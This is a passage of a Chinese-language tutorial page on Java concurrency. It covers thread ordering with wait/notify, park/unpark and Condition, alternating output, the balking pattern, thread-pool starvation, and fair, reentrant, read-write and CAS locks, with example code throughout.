class="comment">//检查队列已经满</span></span><br><span class="line">            <span class="keyword">while</span> (linkedList.size()==capacity)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    linkedList.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            linkedList.addLast(message);</span><br><span class="line">            linkedList.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Message</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> Object value;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Message</span><span class="params">(<span class="keyword">int</span> id, Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Message&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, value=&quot;</span> + value +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4、同步之顺序控制"><a href="#4、同步之顺序控制" class="headerlink" title="4、同步之顺序控制"></a>4、同步之顺序控制</h4><h5 id="4-1-wait-notify"><a href="#4-1-wait-notify" class="headerlink" title="4.1 wait/notify"></a>4.1 wait/notify</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> Object lock=<span class="keyword">new</span> Object();</span><br><span class="line"><span class="comment">//表示t2是否运行过</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">boolean</span> t2runned=<span class="keyword">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Thread t1=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock)&#123;</span><br><span class="line">            <span class="keyword">while</span> (!t2runned)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="string">&quot;t1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Thread t2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;t2&quot;</span>);</span><br><span class="line">            t2runned=<span class="keyword">true</span>;</span><br><span class="line">            lock.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line"></span><br><span class="line">    t1.start();</span><br><span class="line">    t2.start();</span><br></pre></td></tr></table></figure>

<h5 id="4-2-park-unpark"><a href="#4-2-park-unpark" class="headerlink" title="4.2 park/unpark"></a>4.2 park/unpark</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t1=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    LockSupport.park();</span><br><span class="line">    System.out.println(<span class="string">&quot;t1&quot;</span>);</span><br><span class="line">&#125;,<span class="string">&quot;t1&quot;</span>);</span><br><span class="line"></span><br><span class="line">Thread t2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t2&quot;</span>);</span><br><span class="line">    LockSupport.unpark(t1);</span><br><span class="line">&#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line"></span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br></pre></td></tr></table></figure>

<h5 id="4-4-await-signal"><a href="#4-4-await-signal" class="headerlink" title="4.4 await/signal"></a>4.4 await/signal</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ReentrantLock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line">Condition condition = lock.newCondition();</span><br><span class="line">Thread t1=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        condition.await();</span><br><span class="line">        System.out.println(<span class="string">&quot;t1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="string">&quot;t1&quot;</span>);</span><br><span class="line"></span><br><span class="line">Thread t2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;t2&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        condition.signal();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="string">&quot;t2&quot;</span>);</span><br><span class="line"></span><br><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br></pre></td></tr></table></figure>



<h4 id="5、交替输出"><a href="#5、交替输出" class="headerlink" title="5、交替输出"></a>5、交替输出</h4><h5 id="wait-notify"><a href="#wait-notify" class="headerlink" title="wait/notify"></a>wait/notify</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WaitNotify</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        WaitNotify waitNotify=<span class="keyword">new</span> WaitNotify(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            waitNotify.print(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            waitNotify.print(<span class="string">&quot;b&quot;</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            waitNotify.print(<span class="string">&quot;c&quot;</span>,<span class="number">3</span>,<span class="number">1</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String str,<span class="keyword">int</span> waitFlag,<span class="keyword">int</span> nextFlag)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;loopNumber; i++) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span> (flag!=waitFlag)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">this</span>.wait();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">//改变等待标记</span></span><br><span class="line">                flag=nextFlag;</span><br><span class="line">                <span class="keyword">this</span>.notifyAll();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待标记</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="comment">//循环次数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> loopNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WaitNotify</span><span class="params">(<span class="keyword">int</span> flag, <span class="keyword">int</span> loopNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">        <span class="keyword">this</span>.loopNumber = loopNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="await-signal"><a href="#await-signal" class="headerlink" title="await/signal"></a>await/signal</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AwaitSignal</span> <span class="keyword">extends</span> <span class="title">ReentrantLock</span> </span>&#123;</span><br><span class="line">    <span class="comment">//循环次数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> loopNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AwaitSignal</span><span class="params">(<span class="keyword">int</span> loopNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.loopNumber = loopNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> str   打印的内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> current   条件变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> next  下个条件变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String str,Condition current,Condition next)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;loopNumber; i++) &#123;</span><br><span class="line">            lock();</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                current.await();</span><br><span class="line">                System.out.print(str);</span><br><span class="line">                next.signal();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">AwaitSignal awaitSignal=<span class="keyword">new</span> AwaitSignal(<span class="number">5</span>);</span><br><span class="line">Condition a=awaitSignal.newCondition();</span><br><span class="line">Condition b=awaitSignal.newCondition();</span><br><span class="line">Condition c=awaitSignal.newCondition();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    awaitSignal.print(<span class="string">&quot;a&quot;</span>,a,b);</span><br><span class="line">&#125;).start();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    awaitSignal.print(<span class="string">&quot;b&quot;</span>,b,c);</span><br><span class="line">&#125;).start();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    awaitSignal.print(<span class="string">&quot;c&quot;</span>,c,a);</span><br><span class="line">&#125;).start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于一开始都进入等待</span></span><br><span class="line">Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">awaitSignal.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;开始&quot;</span>);</span><br><span class="line">    a.signal();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    awaitSignal.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="park-unpark"><a href="#park-unpark" class="headerlink" title="park/unpark"></a>park/unpark</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class ParkUnpark&#123;</span><br><span class="line">    &#x2F;&#x2F;循环次数</span><br><span class="line">    private int loopNumber;</span><br><span class="line"></span><br><span class="line">    public ParkUnpark(int loopNumber) &#123;</span><br><span class="line">        this.loopNumber &#x3D; loopNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void print(String str,Thread next)&#123;</span><br><span class="line">        for (int i &#x3D; 0; i &lt;loopNumber; i++) &#123;</span><br><span class="line">            LockSupport.park();</span><br><span class="line">            System.out.print(str);</span><br><span class="line">            LockSupport.unpark(next);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Thread t1;</span><br><span class="line"><span class="keyword">static</span> Thread t2;</span><br><span class="line"><span class="keyword">static</span> Thread t3;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    ParkUnpark parkUnpark=<span class="keyword">new</span> ParkUnpark(<span class="number">5</span>);</span><br><span class="line">    t1=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        parkUnpark.print(<span class="string">&quot;a&quot;</span>,t2);</span><br><span class="line">    &#125;);</span><br><span class="line">    t2=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        parkUnpark.print(<span class="string">&quot;b&quot;</span>,t3);</span><br><span class="line">    &#125;);</span><br><span class="line">    t3=<span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        parkUnpark.print(<span class="string">&quot;c&quot;</span>,t1);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    t1.start();</span><br><span class="line">    t2.start();</span><br><span class="line">    t3.start();</span><br><span class="line">    LockSupport.unpark(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="6、犹豫模式"><a href="#6、犹豫模式" class="headerlink" title="6、犹豫模式"></a>6、犹豫模式</h4><blockquote>
<p>balking模式用于在一个线程发现另一个线程或本线程已经做了某一件相同的事，那么本线程无需再做，直接返回</p>
<p>存在读写操作，需要保证原子性，<strong>不能使用volatile(适用于只有一个写操作)</strong></p>
<p>为了提高性能，尽量使得临界区的代码少。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//启动监控线程</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (starting) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        starting = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      monitor = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (stop) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;标志为true,中断线程&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//中断标志为false.进入睡眠</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="comment">//在sleep时被打断会抛出异常</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;monitor&quot;</span>);</span><br><span class="line">        monitor.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="7、工作模式"><a href="#7、工作模式" class="headerlink" title="7、工作模式"></a>7、工作模式</h4><blockquote>
<p>让有限的工作线程来轮流异步处理无限多的任务</p>
</blockquote>
<h5 id="7-1-饥饿"><a href="#7-1-饥饿" class="headerlink" title="7.1 饥饿"></a>7.1 饥饿</h5><blockquote>
<p><strong>线程数量不足导致的饥饿，常出现在固定大小的线程池中</strong></p>
<p>不同的任务类型应该使用不同的线程池，这样能够避免饥饿，并能提高效率</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newFixedThreadPool(<span class="number">4</span>);</span><br><span class="line">pool.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;处理点餐&quot;</span>);</span><br><span class="line">    Future&lt;String&gt; f = pool.submit(() -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;做菜&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;cook&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(f.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pool.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;处理点餐&quot;</span>);</span><br><span class="line">    Future&lt;String&gt; f1=pool.submit(()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;做菜&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;cook&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(f1.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>解决</strong></p>
<blockquote>
<p>不同的任务类型使用不同的线程池</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点餐线程池</span></span><br><span class="line">ExecutorService pool = Executors.newFixedThreadPool(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//cook线程池</span></span><br><span class="line">ExecutorService cookPool= Executors.newFixedThreadPool(<span class="number">1</span>);</span><br><span class="line">pool.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;处理点餐&quot;</span>);</span><br><span class="line">    Future&lt;String&gt; f = cookPool.submit(() -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;做菜&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;cook&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(f.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pool.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;处理点餐&quot;</span>);</span><br><span class="line">    Future&lt;String&gt; f1=cookPool.submit(()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;做菜&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;cook&quot;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(f1.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="7-2-池大小"><a href="#7-2-池大小" class="headerlink" title="7.2 池大小"></a>7.2 池大小</h5><h6 id="CPU密集运算"><a href="#CPU密集运算" class="headerlink" title="CPU密集运算"></a>CPU密集运算</h6><blockquote>
<p>cpu核数+1实现最优的CPU利用率。</p>
<p>+1是保证当线程故障或暂停时，额外线程能够顶上，保证CPU时钟周期不被浪费。</p>
</blockquote>
<h6 id="IO密集运算"><a href="#IO密集运算" class="headerlink" title="IO密集运算"></a>IO密集运算</h6><h3 id="十、锁"><a href="#十、锁" class="headerlink" title="十、锁"></a>十、锁</h3><blockquote>
<p>用于优化锁，见于3.5 Synchronized优化</p>
</blockquote>
<p>锁一共有4种状态，级别从低到高依次是：<strong>无锁状态、偏向锁状态、轻量级锁状态和重量级锁状态</strong>，这几个状态会随着竞争情况逐渐升级。<strong>锁可以升级但不能降级</strong>，意味着偏向锁升级成轻量级锁后不能降级成偏向锁。这种锁升级却不能降级的策略，目的是为了提高获得锁和释放锁的效率。</p>
<h4 id="（1）公平锁和非公平锁"><a href="#（1）公平锁和非公平锁" class="headerlink" title="（1）公平锁和非公平锁"></a>（1）公平锁和非公平锁</h4><p>公平锁：是指多个线程按照申请锁的顺序来获取锁</p>
<p>非公平锁：是指多个线程获取锁的顺序并不是按照申请锁的顺序，有可能后申请的线程优先获取锁</p>
<p><strong>非公平锁一上来就尝试占用锁，若占用失败，就采用公平锁的方式到末尾排队</strong></p>
<blockquote>
<p><strong>公平锁 VS 非公平锁</strong></p>
</blockquote>
<p>1、公平锁每次获取到的锁为同步队列中的<strong>第一个节点</strong>，<strong>保证请求资源时间上的绝对顺序</strong>，</p>
<p>​    非公平锁有可能刚释放锁的线程下次继续获取该锁，则有可能导致其他线程永远无法获取到锁，<strong>造成“饥饿”现象</strong>。</p>
<img src="https://csn.damyoung.cn/image-20201007191641779.png" alt="image-20201007191641779" style="zoom:67%;" />

<p>​    </p>
<p>2、公平锁为了保证时间上的绝对顺序，需要频繁的<strong>上下文切换</strong>，而非公平锁会降低一定的上下文切换，降低性能开销。</p>
<p>​        因此，ReentrantLock默认选择的是非公平锁，则是为了减少一部分上下文切换，<strong>保证了系统更大的吞吐量</strong>。</p>
<h4 id="（2）递归锁"><a href="#（2）递归锁" class="headerlink" title="（2）递归锁"></a>（2）递归锁</h4><p>递归锁（可重入锁ReentrantLock）</p>
<blockquote>
<ul>
<li><p>表示该锁能够支持一个线程对资源的重复加锁。</p>
</li>
<li><p>该锁的还支持获取锁时的公平和非公平性选择。</p>
</li>
<li><p>如果一个锁不支持可重入，那当一个线程调用它的lock()方法获取锁之后，如果再次调用lock()方法，则该线程将会被自己所阻塞。</p>
</li>
</ul>
</blockquote>
<p>synchronized关键字隐式的支持重进入，比如一个synchronized修饰的递归方法，在方法执行时，执行线程在获取了锁之后仍能连续多次地获得该锁。ReentrantLock虽然没能像synchronized关键字一样支持隐式的重进入，但是在调用lock()方法时，已经获取到锁的线程，能够再次调用lock()方法获取锁而不被阻塞。</p>
<h5 id="可重入性"><a href="#可重入性" class="headerlink" title="可重入性"></a>可重入性</h5><p>重进入是指任意线程在获取到锁之后能够再次获取该锁而不会被锁所阻塞，该特性的实现需要解决以下两个问题。</p>
<ul>
<li><strong>线程再次获取锁</strong>。锁需要去识别获取锁的线程是否为当前占据锁的线程，如果是，则再次成功获取。</li>
<li><strong>锁的最终释放</strong>。线程重复n次获取了锁，随后在第n次释放该锁后，其他线程能够获取到该锁。锁的最终释放要求锁对于获取进行计数自增，计数表示当前锁被重复获取的次数，而锁被释放时，计数自减，当计数等于0时表示锁已经成功释放。</li>
</ul>
<h4 id="（3）读写锁"><a href="#（3）读写锁" class="headerlink" title="（3）读写锁"></a>（3）读写锁</h4><blockquote>
<p>ReentrantReadWriteLock</p>
</blockquote>
<blockquote>
<ul>
<li>读写锁用的<strong>同一个Sync同步器，因此等待队列、state等也是同一个</strong><ul>
<li>写锁占state低16位，读锁占用高16位</li>
</ul>
</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201008134833759.png" alt="image-20201008134833759" style="zoom:67%;" />

<ul>
<li>拥有ReadLock和WriteLock俩个内部类、Syn内部类</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201011110445480.png" alt="image-20201011110445480" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201011110514236.png" alt="image-20201011110514236" style="zoom: 80%;" />



<h5 id="3-1-独占锁"><a href="#3-1-独占锁" class="headerlink" title="3.1 独占锁"></a>3.1 独占锁</h5><p>这些锁在同一时刻只允许<strong>一个线程</strong>进行访问</p>
<h5 id="3-2-共享锁"><a href="#3-2-共享锁" class="headerlink" title="3.2 共享锁"></a>3.2 共享锁</h5><p>这些锁在同一时刻可以被多个线程所持有</p>
<h5 id="3-3-读写锁"><a href="#3-3-读写锁" class="headerlink" title="3.3 读写锁"></a>3.3 读写锁</h5><p>ReentrantReadWriteLock其读锁是共享锁(并发)，其写锁是独占锁(互斥)</p>
<blockquote>
<ul>
<li><p>读锁的共享锁可保证<strong>并发读</strong>是非常高效的，但读写、写读、写写的过程是互斥的</p>
</li>
<li><p>读写锁在同一时刻可以允许<strong>多个读线程</strong>访问，但是在<strong>写线程</strong>访问时，所有的读线程和其他写线程均被阻塞。</p>
</li>
<li><p>读写锁维护了一对锁，一个读锁和一个写锁，通过<strong>分离读锁和写锁</strong>，使得<strong>并发性</strong>相比一般的排他锁有了很大提升。</p>
</li>
</ul>
</blockquote>
<p>读写锁主要有以下三个特性：</p>
<ul>
<li><strong>公平性选择</strong>：支持非公平性（默认）和公平性锁获取方式，吞吐量还是非公平优于公平；</li>
<li><strong>重入性</strong>：支持重入<ul>
<li>读锁获取后能再次获取</li>
<li>写锁获取之后能够再次获取写锁，同时也能够获取读锁</li>
<li>但不支持锁升级，即在读锁下再次获取写锁</li>
</ul>
</li>
<li><strong>锁降级</strong>：遵循获取写锁，获取读锁再释放写锁的次序，写锁能够降级成为读锁</li>
<li><strong>读锁不支持条件变量</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ReentrantReadWriteLock reentrantReadWriteLock=<span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line"><span class="comment">//读锁对象</span></span><br><span class="line"><span class="keyword">private</span> ReentrantReadWriteLock.ReadLock readLock=reentrantReadWriteLock.readLock();</span><br><span class="line"><span class="comment">//写锁对象</span></span><br><span class="line"><span class="keyword">private</span> ReentrantReadWriteLock.WriteLock writeLock=reentrantReadWriteLock.writeLock();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;获取读锁&quot;</span>);</span><br><span class="line">    readLock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;读取&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        readLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">()</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;获取写锁&quot;</span>);</span><br><span class="line">    writeLock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;写入&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        writeLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="（4）乐观锁"><a href="#（4）乐观锁" class="headerlink" title="（4）乐观锁"></a>（4）乐观锁</h4><p>CAS是什么</p>
<p>（1）<strong>CAS是乐观锁，非阻塞锁</strong> compare and swap</p>
<p>它认为在线程在共享资源时不会发生冲突，不会发生冲突自然就不会阻塞其他线程的操作，故线程也就不会出现阻塞</p>
<p>无锁操作是使用**CAS(compare and swap)**又叫做比较交换来鉴别线程是否出现冲突，出现冲突就重试当前操作直到没有冲突为止。</p>
